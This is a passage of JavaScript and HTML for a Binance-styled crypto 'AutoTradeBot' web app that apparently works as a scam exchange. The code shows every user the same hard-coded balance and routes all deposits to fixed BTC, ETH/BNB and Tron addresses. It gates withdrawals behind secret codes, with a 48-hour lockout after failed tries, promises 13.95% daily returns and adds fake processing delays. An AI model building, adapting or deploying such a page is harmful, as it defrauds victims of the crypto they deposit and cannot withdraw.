        <div id="notifList"></div>
      </div>
    </section>
  </main>

  <!-- FOOTER NAV (Binance style) -->
  <footer class="fixed bottom-0 left-0 right-0 bg-black border-t border-gray-800 z-30">
    <nav class="flex justify-between items-center max-w-3xl mx-auto px-2 py-2">
      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="home" id="tab-home">
        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M3 9.5L12 3l9 6.5V21a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5z'/></svg>" class="w-6 h-6" />
        <span class="text-[11px] mt-0.5">Home</span>
      </button>
      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="markets" id="tab-markets">
        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M3 3v18h18'/><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M7 15l4-6 5 8 3-4'/></svg>" class="w-6 h-6" />
        <span class="text-[11px]">Markets</span>
      </button>
      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="trade" id="tab-trade">
        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M3 12h18M12 3v18'/></svg>" class="w-6 h-6"/>
        <span class="text-[11px]">Trade</span>
      </button>
      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="futures" id="tab-futures">
        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M12 2v20M5 7h14'/></svg>" class="w-6 h-6"/>
        <span class="text-[11px]">Futures</span>
      </button>
      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="wallets" id="tab-wallets">
        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><rect x='2' y='6' width='20' height='12' rx='2'/><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16 12a1 1 0 101 1 1 1 0 00-1-1z'/></svg>" class="w-6 h-6"/>
        <span class="text-[11px]">Wallets</span>
      </button>
    </nav>
  </footer>

  <!-- PWA/SW Registration -->
  <script>
    // register Service Worker
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('service-worker.js');
      });
    }
  // INSTALL PROMPT LOGIC (update)
let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  show($('#installPrompt'));
});

$('#getMobileAppBtn').onclick = function() {
  // If the prompt event is available, show it
  if (deferredPrompt) {
    show($('#installPrompt'));
  } else {
    // fallback instructions
    alert("To install: Use your browser's menu and select 'Add to Home screen'.");
  }
};
$('#installNowBtn').onclick = async function() {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    const { outcome } = await deferredPrompt.userChoice;
    if (outcome === 'accepted') {
      hide($('#installPrompt'));
      // Optional: Show a confirmation or animation
      alert('App is being installed! You can now launch it from your home screen.');
    }
  } else {
    alert("To install: Use your browser's menu and select 'Add to Home screen'.");
  }
};
$('#maybeLaterBtn').onclick = function() {
  hide($('#installPrompt'));
};

// ======= CONSTANTS =======
const TOTAL_BALANCE = 8250.78;
const USDT_DECIMALS = 6;
const walletAccountIDs = [
  "1048291756","9584207136","6732810945","4029158736","8164072395",
  "2057819463","9174623085","3841957260","5297401863","7609284153",
  "4632185097","5827049136","8714956203","6497012835","2396185740",
  "5048731962","7836241905","6104298735","9581726403","7246093815",
  "4308169527","8924056713","5179302468","3589172406","1497825036"
];
const validCodes = ["483921", "175064", "902718", "634285", "217509", "856430", "490127", "731694", "562803", "308417", "941256", "128374", "675820", "203519", "487960", "819432", "356701", "740528", "612947", "098135", "573864", "284691", "160738", "495260", "837514", "021693", "658407", "794135", "320586", "946172"];
let sendAttempts = 0;

// Deposit addresses (per network)
const depositAddresses = {
  "Bitcoin":   { addr: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu", label: "Bitcoin [BTC] Native" },
  "Ethereum":  { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "Ethereum [ERC-20]" },
  "BNB":       { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "BNB Smart Chain [BEP20]" },
  "Tron":      { addr: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco", label: "Tron [TRC-20]" }
};

// ========== STORAGE KEYS ==========
const LS = {
  user: "autoTrade_user", // {address, accountId, 2fa, ...}
  walletMap: "autoTrade_walletMap", // {address -> accountId}
  transactions: "autoTrade_transactions", // array
  withdraws: "autoTrade_withdrawals", // array
  withdrawSusp: "autoTrade_withdrawSusp", // {accountId: {until: timestamp, count: n}}
  tradePositions: "autoTrade_trades", // array of {asset, start, end, dailyRate, amount, returns}
  notif: "autoTrade_notif", // {enabled: true}
  notifMsgs: "autoTrade_notifMsgs", // [array]
  twofa: "autoTrade_2fa", // {accountId: secret}
  twofaStatus: "autoTrade_2faStatus", // {accountId: true/false}
  theme: "autoTrade_theme"
};

// ========== UTILS ==========
// DOM helpers
function $(sel) { return document.querySelector(sel); }
function $all(sel) { return Array.from(document.querySelectorAll(sel)); }
const sleep = ms => new Promise(r=>setTimeout(r,ms));
function fmtUsd(n) { return typeof n === 'number' ? n.toLocaleString('en-US', {style:'currency',currency:'USD'}) : n; }
function shortAddr(addr) {
  if (!addr || typeof addr !== 'string') return "";
  if (addr.startsWith('0x') && addr.length > 10)
    return addr.slice(0,6) + "..." + addr.slice(-4);
  if (addr.length > 12) return addr.slice(0,5)+"..."+addr.slice(-4);
  return addr;
}
function now() { return Math.floor(Date.now()/1000); }
function saveLS(key, val) { localStorage.setItem(key, JSON.stringify(val)); }
function getLS(key, fallback) { try { return JSON.parse(localStorage.getItem(key)) ?? fallback; } catch { return fallback; } }
function delLS(key) { localStorage.removeItem(key); }
function show(el) { el.classList.remove('hide'); }
function hide(el) { el.classList.add('hide'); }
function copyToClipboard(txt) { navigator.clipboard.writeText(txt); }
function daysBetween(a,b) { return Math.ceil((b-a)/86400); }
function formatCountdown(s) {
  let d = Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60), sec=(s%60);
  return `${d>0?d+"d ":""}${h}h ${m}m ${sec}s`;
}

// ========== APP STATE ==========
let app = {
  user: null, // {address, accountId, ...}
  walletMap: {}, // {address: accountId}
  transactions: [],
  withdrawals: [],
  withdrawSusp: {},
  tradePositions: [],
  notif: {enabled:false},
  notifMsgs: [],
  twofa: {},
  twofaStatus: {},
  coinCache: [],
  marketTop: [],
  isLoading: false
};
// Load all persistent state
function loadAppState() {
  app.user = getLS(LS.user,null);
  app.walletMap = getLS(LS.walletMap,{});
  app.transactions = getLS(LS.transactions,[]);
  app.withdrawals = getLS(LS.withdraws,[]);
  app.withdrawSusp = getLS(LS.withdrawSusp,{});
  app.tradePositions = getLS(LS.tradePositions,[]);
  app.notif = getLS(LS.notif,{enabled:false});
  app.notifMsgs = getLS(LS.notifMsgs,[]);
  app.twofa = getLS(LS.twofa,{});
  app.twofaStatus = getLS(LS.twofaStatus,{});
  app.theme = getLS(LS.theme,"dark");
}

// ========== PAGE NAV ==========
// Show only one page at a time (SPA)
function switchPage(pageId) {
  $all('.page').forEach(p => p.classList.add('hidden'));
  $('#' + pageId).classList.remove('hidden');
  // lazy load for markets
  if (pageId === 'markets') loadMarkets();
  // charts
  if (pageId === 'home') createTV('tvchart','BINANCE:BTCUSDT');
  if (pageId === 'trade') createTV('tradeChart','BINANCE:BTCUSDT');
  if (pageId === 'futures') createTV('futuresChart','BINANCE:BTCUSDT');
}
// Footer nav
$all('.tab').forEach(t=>t.addEventListener('click',()=>{
  const tgt=t.dataset.target; switchPage(tgt);
  $all('.tab').forEach(x=>x.classList.remove('tab-active','opacity-100'));
  t.classList.add('tab-active');
}));

// ========== MARKETS ==========
async function loadMarkets() {
  try {
    const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false&price_change_percentage=24h';
    const res = await fetch(url); const data = await res.json();
    // Fill Top coins & Market list
    app.marketTop = data;
    $('#topCoinsList').innerHTML = data.slice(0,8).map(c=>`
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name} <span class="text-xs text-gray-400 uppercase">(${c.symbol})</span></div>
            <div class="text-xs text-gray-500">Mkt Cap: ${Math.round(c.market_cap).toLocaleString()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    $('#marketsList').innerHTML = data.map(c=>`
      <div class="flex items-center justify-between p-2 border-b border-gray-800" data-coin="${c.id}">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name}</div>
            <div class="text-xs text-gray-400">${c.symbol.toUpperCase()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    // Gainers & Losers
    const sorted = data.slice().sort((a,b)=>(b.price_change_percentage_24h||0)-(a.price_change_percentage_24h||0));
    $('#gainers').innerHTML = sorted.slice(0,4).map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-green-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
    $('#losers').innerHTML = sorted.slice(-4).reverse().map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-red-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
  } catch(e){console.warn('markets failed',e);}
}

// ========== USDT / WALLET ==========
async function loadUsdt() {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/coins/tether');
    const data = await res.json();
    $('#usdtLogo').src = data.image.thumb;
    const market = await (await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=tether')).json();
    if (market && market[0]) $('#usdtPrice').innerText = fmtUsd(market[0].current_price);
    // Wallet Portfolio
    $('#walletHoldings').innerHTML = `<div class="flex items-center justify-between">
      <div class="flex items-center gap-3">
        <img src="${data.image.thumb}" class="w-6 h-6 rounded" />
        <div>
          <div class="font-medium">Tether USD (USDT)</div>
          <div class="text-xs text-gray-400">Balance</div>
        </div>
      </div>
      <div class="text-right font-semibold">${fmtUsd(TOTAL_BALANCE)}</div>
    </div>`;
  } catch(e){console.warn('usdt failed',e);}
}

// ========== TRADINGVIEW CHARTS ==========
function createTV(containerId, symbol='BINANCE:BTCUSDT') {
  const container = document.getElementById(containerId); if (container) container.innerHTML = '';
  return new window.TradingView.widget({
    container_id: containerId,
    width: '100%',
    height: container?.clientHeight || 320,
    symbol,
    interval: '60',
    timezone: 'Etc/UTC',
    theme: 'dark',
    style: '1',
    locale: 'en',
    toolbar_bg: '#0b0f14',
    enable_publishing: false,
    withdateranges: true,
    allow_symbol_change: true
  });
}
let tvHome = createTV('tvchart', 'BINANCE:BTCUSDT');
let tvTrade = createTV('tradeChart', 'BINANCE:BTCUSDT');
let tvFutures = createTV('futuresChart', 'BINANCE:BTCUSDT');
$('#loadSymbol').addEventListener('click', ()=> {
  const sym = $('#tradeSymbol').value;
  tvTrade = createTV('tradeChart', sym);
});

// ========== INITIAL LOAD ==========
(async function init(){
  loadAppState();
  // Set wallet/account info if logged in
  if (app.user?.accountId) {
    $('#walletId').innerText = app.user.accountId;
    $('#walletId2').innerText = app.user.accountId;
  }
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  await loadUsdt();
  await loadMarkets();
  setInterval(loadMarkets, 60000);
  setInterval(loadUsdt, 60000);
  // Handle notification popups
  handleMarketNotif();
  // Show landing or home
  if (app.user?.accountId) switchPage('home');
  else switchPage('landingPage');
})();

// ========== INSTALL PROMPT ==========
document.getElementById('getMobileAppBtn').onclick = function() {
  show($('#installPrompt'));
};
$('#installNowBtn').onclick = function() { /* PWA logic handled in index.html */ hide($('#installPrompt')); };
$('#maybeLaterBtn').onclick = function() { hide($('#installPrompt')); };

// ========== MORE MENU ==========
$('#moreBtn').addEventListener('click', ()=> $('#moreMenu').classList.toggle('hidden'));
document.addEventListener('click', (e)=> {
  if (!e.target.closest('#moreBtn') && !e.target.closest('#moreMenu')) $('#moreMenu').classList.add('hidden');
});

// ========== NOTIFICATIONS ==========
function handleMarketNotif() {
  // If enabled, fetch CoinGecko news every 12h and show popup
  if (app.notif.enabled) {
    // Show popup if new
    let lastPop = getLS("autoTrade_lastNotif",0);
    if (now()-lastPop > 43200) { // 12h
      fetch('https://api.coingecko.com/api/v3/status_updates?project_type=coin&per_page=1&page=1')
      .then(r=>r.json()).then(res=>{
        if (res?.status_updates?.length) {
          let news = res.status_updates[0].description;
          $('#homeMarketNotif').innerText = news;
          show($('#homeMarketNotif'));
          setTimeout(()=>hide($('#homeMarketNotif')),9000);
          localStorage.setItem("autoTrade_lastNotif",now());
        }
      });
    }
  }
}

// ========== WALLET CONNECT ==========
let currentProvider = null, connectedAddr = null;
$('#connectWalletBtn').onclick = async function() {
  show($('#walletModal'));
};
$('#closeWalletModal').onclick = function() { hide($('#walletModal')); };
$('#connectMetaMask').onclick = async function() {
  hide($('#walletModal'));
  if (window.ethereum) {
    try {
      const [addr] = await window.ethereum.request({method:"eth_requestAccounts"});
      connectedAddr = addr;
      onWalletConnected(addr);
    } catch(e){alert("MetaMask error: "+e.message);}
  } else alert("MetaMask not detected.");
};
$('#connectWalletConnect').onclick = async function() {
  hide($('#walletModal'));
  // Simulate, as full WalletConnect logic is lengthy
  let addr = prompt("Enter your Ethereum address (WalletConnect simulation):");
  if (addr && addr.length > 5) onWalletConnected(addr);
};
$('#connectTron').onclick = async function() {
  hide($('#walletModal'));
  if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
    connectedAddr = window.tronWeb.defaultAddress.base58;
    onWalletConnected(connectedAddr);
  } else alert("TronLink not detected.");
};
$('#manualAddress').onclick = function() {
  show($('#manualAddressInput'));
};
$('#manualConfirm').onclick = function() {
  let v = $('#manualInput').value.trim();
  if (v && v.length > 5) { hide($('#walletModal')); onWalletConnected(v); }
  else alert("Invalid address.");
};
function onWalletConnected(addr) {
  // Assign accountId if needed
  let map = getLS(LS.walletMap,{});
  let accId = map[addr];
  if (!accId) {
    // assign unused
    let used = Object.values(map);
    accId = walletAccountIDs.find(id=>!used.includes(id));
    if (!accId) accId = String(Math.floor(1000000000+Math.random()*9000000000));
    map[addr] = accId;
    saveLS(LS.walletMap,map);
  }
  app.user = {address: addr, accountId: accId};
  saveLS(LS.user, app.user);
  $('#walletId').innerText = accId;
  $('#walletId2').innerText = accId;
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  show($('#saveAccPopup'));
  switchPage('home');
}

// ========== LOGIN ID PAGE ==========
$('#loginIdBtn').onclick = function() {
  $('#loginInput').value = '';
  $('#loginMsg').innerText = '';
  show($('#loginModal'));
};
$('#loginConfirm').onclick = async function() {
  let v = $('#loginInput').value.trim();
  if (!v.match(/^\d{10}$/)) { $('#loginMsg').innerText = "Enter a valid 10-digit Account ID."; return; }
  $('#loginMsg').innerText = "Logging in...";
  await sleep(15000);
  // Check mapping
  let wmap = getLS(LS.walletMap,{});
  let found = Object.entries(wmap).find(([a,id])=>id===v);
  if (found) {
    app.user = {address: found[0], accountId: v};
    saveLS(LS.user, app.user);
    $('#walletId').innerText = v;
    $('#walletId2').innerText = v;
    $('#loginMsg').innerText = "Success!";
    hide($('#loginModal'));
    switchPage('home');
  } else {
    $('#loginMsg').innerText = "Connect wallet to get a wallet id.";
  }
};
$('#loginModal').addEventListener('click',e=>{
  if(e.target===e.currentTarget)hide($('#loginModal'));
});

// ========== SAVE ACCOUNT POPUP ==========
$('#showAccountBtn').onclick = function() {
  // Fill account modal
  $('#accModalAddr').innerText = app.user?.address||"";
  $('#accModalID').innerText = app.user?.accountId||"";
  $('#accModalBal').innerText = fmtUsd(TOTAL_BALANCE);
  hide($('#saveAccPopup')); show($('#accountModal'));
};
$('#closeSaveAccPopup').onclick = function() { hide($('#saveAccPopup')); };

// ========== ACCOUNT MODAL ==========
$('#closeAccModal').onclick = function() { hide($('#accountModal')); };
$('#secureAccBtn').onclick = function() { hide($('#accountModal')); showGoogleAuth(); };

// ========== GOOGLE AUTH (2FA) ==========
function showGoogleAuth() {
  const accId = app.user?.accountId;
  if (!accId) return;
  // Generate secret if not exist
  let secret = app.twofa[accId] || window.otplib.authenticator.generateSecret();
  app.twofa[accId] = secret;
  saveLS(LS.twofa, app.twofa);
  // QR code
  const uri = window.otplib.authenticator.keyuri(accId, "AutoTradeBot", secret);
  $('#authAccID').innerText = accId;
  $('#gaSecret').innerText = secret;
  var qr = new QRious({element:$('#gaQR'), value:uri, size:120, background:"#fff", foreground:"#000"});
  $('#gaCode').value = ""; $('#gaMsg').innerText = "";
  show($('#authModal'));
}
$('#gaVerifyBtn').onclick = async function() {
  let code = $('#gaCode').value.trim();
  let accId = app.user?.accountId, secret = app.twofa[accId];
  $('#gaMsg').innerText = "Verifying...";
  await sleep(15000);
  if (window.otplib.authenticator.check(code,secret)) {
    app.twofaStatus[accId] = true;
    saveLS(LS.twofaStatus, app.twofaStatus);
    $('#gaMsg').innerText = "2FA enabled!";
  } else {
    $('#gaMsg').innerText = "Invalid code. Try again.";
  }
};
$('#gaCloseBtn').onclick = function() { hide($('#authModal')); };

// ========== DEPOSIT ==========
$('#depositBtn').onclick = async function() {
  $('#depositSearch').value = "";
  // Load coins
  if (!app.coinCache.length) {
    let coins = await fetch('https://api.coingecko.com/api/v3/coins/list').then(r=>r.json());
    let mkts = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=250&page=1').then(r=>r.json());
    app.coinCache = mkts.map(c=>({id:c.id,name:c.name,symbol:c.symbol,thumb:c.image}));
  }
  $('#depositCoinList').innerHTML = app.coinCache.slice(0,15).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
  show($('#depositModal'));
};
$('#closeDepositModal').onclick = function() { hide($('#depositModal')); };
$('#depositSearch').oninput = function() {
  let q=this.value.trim().toLowerCase();
  let coins=app.coinCache.filter(c=>c.name.toLowerCase().includes(q)||c.symbol.includes(q));
  $('#depositCoinList').innerHTML = coins.slice(0,25).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
};
// Coin click: show network modal
$('#depositCoinList').onclick = function(e) {
  let row = e.target.closest('.coin-row'); if (!row) return;
  $('#depositModal').classList.add('hide');
  // Show network selection
  $('#depositNetList').innerHTML = Object.keys(depositAddresses).map(net=>`
    <button class="btn btn-secondary w-full my-2 deposit-net-btn" data-net="${net}">${depositAddresses[net].label}</button>
  `).join('');
  show($('#depositNetworkModal'));
};
$('#closeDepositNetModal').onclick = function() { hide($('#depositNetworkModal')); };
// Network select: show address/qr
$('#depositNetList').onclick = function(e) {
  let btn = e.target.closest('.deposit-net-btn');
  if (!btn) return;
  let net = btn.dataset.net;
  let addr = depositAddresses[net].addr;
  $('#depNetLabel').innerText = depositAddresses[net].label;
  $('#depAddrLabel').innerText = addr;
  // QR
  new QRious({element:$('#depQrCanvas'), value:addr, size:120, background:"#fff", foreground:"#000"});
  show($('#depositAddressModal'));
};
$('#copyDepAddr').onclick = function() {
  copyToClipboard($('#depAddrLabel').innerText);
  alert("Address copied!");
};
$('#closeDepositAddrModal').onclick = function() { hide($('#depositAddressModal')); };

// ========== WITHDRAW ==========
$('#withdrawBtn').onclick = function() { show($('#withdrawSheet')); };
$('#closeWithdrawSheet').onclick = function() { hide($('#withdrawSheet')); };
$('#onChainTransferBtn').onclick = function() {
  hide($('#withdrawSheet'));
  $('#wdAddr').value = '';
  $('#wdAmt').value = '';
  $('#wdDetailMsg').innerText = "";
  $('#wdNetwork').value = "Ethereum";
  show($('#withdrawDetailModal'));
};
$('#fillFromWallet').onclick = function() {
  $('#wdAddr').value = app.user?.address || "";
};
$('#wdMaxBtn').onclick = function() {
  $('#wdAmt').value = TOTAL_BALANCE;
};
$('#closeWithdrawDetail').onclick = function() { hide($('#withdrawDetailModal')); };
$('#wdSubmitBtn').onclick = function() {
  let addr = $('#wdAddr').value.trim();
  let amt = parseFloat($('#wdAmt').value);
  if (!addr || isNaN(amt) || amt<=0) { $('#wdDetailMsg').innerText="Enter valid address and amount"; return; }
  hide($('#withdrawDetailModal'));
  $('#wdCodeInput').value = ""; $('#wdCodeMsg').innerText="";
  show($('#withdrawCodeModal'));
};
$('#closeWithdrawCode').onclick = function() { hide($('#withdrawCodeModal')); };

$('#wdCodeSubmit').onclick = async function() {
  let code = $('#wdCodeInput').value.trim();
  let addr = $('#wdAddr').value.trim(), amt = parseFloat($('#wdAmt').value), net = $('#wdNetwork').value;
  $('#wdCodeMsg').innerText = "Processing...";
  await sleep(15000);

  // 48h suspension check
  let susp = getLS(LS.withdrawSusp, {})[app.user.accountId];
  if (susp && now() < susp.until) {
    $('#wdCodeMsg').innerText = `Withdrawals suspended for ${formatCountdown(susp.until-now())}`;
    return;
  }
  if (validCodes.includes(code)) {
    // Start withdrawal with 24hr countdown, persist
    let wd = {
      address: addr, amount: amt, network: net,
      start: now(), end: now()+86400, status: "processing",
      userId: app.user.accountId
    };
    let withdrawals = getLS(LS.withdraws, []);
    withdrawals.push(wd);
    saveLS(LS.withdraws, withdrawals);

    // Add to activity/transactions
    let txs = getLS(LS.transactions, []);
    txs.push({type:'withdraw', ...wd});
    saveLS(LS.transactions, txs);

    hide($('#withdrawCodeModal'));
    showWithdrawProcessing(wd);
    renderOngoingWithdrawals();
  } else {
    sendAttempts++;
    if (sendAttempts >= 5) {
      let suspObj = getLS(LS.withdrawSusp, {});
      suspObj[app.user.accountId] = {until: now()+172800, count: sendAttempts};
      saveLS(LS.withdrawSusp, suspObj);
      $('#wdCodeMsg').innerText = "Withdrawal suspended for 48 hours.";
    } else {
      $('#wdCodeMsg').innerText = "Validation failed please enter correct code";
    }
  }
};

// Show withdrawal processing modal, persistent/refresh-safe
function showWithdrawProcessing(wd) {
  $('#wpAddr').innerText = wd.address;
  $('#wpNetwork').innerText = wd.network;
  $('#wpAmt').innerText = fmtUsd(wd.amount);

  // Countdown update logic
  function update() {
    let cd = wd.end - now();
    $('#wpCountdown').innerText = formatCountdown(cd>0?cd:0);
    if (cd <= 0) {
      clearInterval(timer);
      // Complete withdrawal, deduct, mark as successful
      let withdrawals = getLS(LS.withdraws, []);
      withdrawals = withdrawals.map(w=>{
        if (w.start === wd.start && w.userId === wd.userId && w.address === wd.address) {
          w.status = "completed";
          w.completedAt = now();
        }
        return w;
      });
      saveLS(LS.withdraws, withdrawals);

      // Simulate: set USDT balance to 0.0680
      $('#usdtPrice').innerText = fmtUsd(0.0680);

      // Show success popup
      $('#wsDetails').innerHTML = `
        <div>Address: ${wd.address}</div>
        <div>Amount: ${fmtUsd(wd.amount)}</div>
        <div>Network: ${wd.network}</div>
      `;
      show($('#withdrawSuccessModal'));
      renderOngoingWithdrawals();
    }
  }
  show($('#withdrawProcessModal'));
  update();
  let timer = setInterval(update, 1000);

  $('#wpCloseBtn').onclick = function() {
    hide($('#withdrawProcessModal'));
    clearInterval(timer);
  };
  $('#wpViewDetails').onclick = function() {
    // Redirect to home, scroll to transactions, show ongoing
    switchPage('home');
    hide($('#withdrawProcessModal'));
    setTimeout(renderOngoingWithdrawals, 100);
  };
}

// Withdraw success modal close/cancel
$('#wsCloseBtn').onclick = function() {
  hide($('#withdrawSuccessModal'));
  renderOngoingWithdrawals();
};

// Keep countdown running and activity visible after refresh
function renderOngoingWithdrawals() {
  const ongoing = (getLS(LS.withdraws, []) || []).filter(wd => wd.status === "processing" && now() < wd.end);
  let list = ongoing.map(wd => {
    const left = wd.end-now();
    return `
      <div class="bg-gray-800 rounded p-2 mb-2">
        <div><b>Processing Withdrawal</b></div>
        <div>Address: <span>${wd.address}</span></div>
        <div>Network: <span>${wd.network}</span></div>
        <div>Amount: <span>${fmtUsd(wd.amount)}</span></div>
        <div>Time Remaining: <span class="countdown" data-end="${wd.end}">${formatCountdown(left)}</span></div>
      </div>
    `;
  }).join('');
  $('#recentTx').innerHTML = list || '<div class="text-gray-400">No transactions — demo mode.</div>';
}
function updateCountdownDisplays() {
  $all('.countdown').forEach(el=>{
    const end = parseInt(el.dataset.end,10);
    const left = end-now();
    el.innerText = formatCountdown(left>0?left:0);
  });
}
function restoreWithdrawalsUI() {
  let withdrawals = getLS(LS.withdraws, []);
  withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end)
    .forEach(wd => showWithdrawProcessing(wd));
  renderOngoingWithdrawals();
}
window.addEventListener('DOMContentLoaded', restoreWithdrawalsUI);
setInterval(() => {
  updateCountdownDisplays();
  renderOngoingWithdrawals();
}, 1000);

// ========== SWAP (DEMO) ==========
$('#swapBtn').onclick = ()=>alert("Swap flow (demo)");

// ========== TRADE PAGE ==========
$('#placeOrderBtn').onclick = function() {
  show($('#tradeModal'));
};
$('#closeTradeModal').onclick = function() { hide($('#tradeModal')); };
$('#placeTradeBtn').onclick = function() {
  // Choose asset
  $('#tradeAssetList').innerHTML = app.marketTop.slice(0,10).map(c=>`
    <div class="flex items-center gap-2 p-2 cursor-pointer trade-asset-row" data-symbol="${c.symbol.toUpperCase()}"><img src="${c.image}" class="w-5 h-5"/>${c.name}</div>
  `).join('');
  show($('#tradeAssetModal'));
};
$('#closeTradeAssetModal').onclick = function() { hide($('#tradeAssetModal')); };
// Asset select
$('#tradeAssetList').onclick = function(e) {
  let row = e.target.closest('.trade-asset-row');
  if (!row) return;
  let asset = row.dataset.symbol;
  $('#tradeOrderAsset').innerText = "Asset: "+asset;
  $('#tradeDurSelect').value = "";
  show($('#tradeDurModal'));
};
$('#tradeDurConfirm').onclick = function() {
  let dur = $('#tradeDurSelect').value;
  if (!dur) return;
  $('#tradeOrderDur').innerText = "Duration: "+dur+" months";
  show($('#tradePlaceOrderModal'));
};
$('#tradeOrderBtn').onclick = async function() {
  // Simulate trade activation
  await sleep(15000);
  let pos = {asset: $('#tradeOrderAsset').innerText.replace("Asset: ",""), start: now(), end: now()+parseInt($('#tradeDurSelect').value)*2592000, dailyRate: 0.1395, amount: 1000, returns: 0};
  app.tradePositions.push(pos); saveLS(LS.tradePositions, app.tradePositions);
  hide($('#tradePlaceOrderModal'));
  alert("Trade activated!");
};
$('#tradeTransferBtn').onclick = function() { show($('#tradeTransferModal')); };
$('#closeTransferModal').onclick = function() { hide($('#tradeTransferModal')); };
$('#transferBtn').onclick = async function() {
  await sleep(15000);
  alert("Transfer processed!");
  hide($('#tradeTransferModal'));
};
$('#viewEarningsBtn').onclick = function() { show($('#tradeEarningsModal')); };
$('#closeTradeEarningsModal').onclick = function() { hide($('#tradeEarningsModal')); };

// ========== SETTINGS ==========
$('#settingsBtn').onclick = function() { switchPage('settingsPage'); };
$('#closeAccountBtn').onclick = async function() {
  // 2FA required
  if (!app.twofaStatus[app.user.accountId]) { alert("Enable 2FA first."); return; }
  alert("Deactivating..."); await sleep(15000);
  // Remove user from walletMap
  let map = getLS(LS.walletMap,{}); delete map[app.user.address];
  saveLS(LS.walletMap, map);
  delLS(LS.user); app.user=null;
  switchPage('landingPage');
};
// Theme
$('#themeSelect').onchange = function() {
  app.theme = this.value; saveLS(LS.theme, app.theme);
  document.body.className = app.theme==="light"?"bg-white text-black":"bg-black text-white";
};

// ========== SUPPORT ==========
$('#supportBtn').onclick = function() { switchPage('supportPage'); };
$('#supportSendBtn').onclick = function() {
  let msg = $('#supportUserMsg').value.trim();
  if (!msg) return;
  let box = $('#supportChatBox');
  box.innerHTML += `<div class="mb-2"><b>You:</b> ${msg}</div>`;
  $('#supportUserMsg').value = "";
  // Simulated AI bot
  setTimeout(()=>{box.innerHTML += `<div class="mb-2 text-yellow-400"><b>Bot:</b> Thank you for your message. Our AI assistant will reply soon. For now, check FAQs above.</div>`;box.scrollTop=box.scrollHeight;},1000);
};

// ========== NOTIFICATIONS ==========
$('#notifBtn').onclick = function() { switchPage('notifPage'); };
$('#notifToggle').onchange = function() {
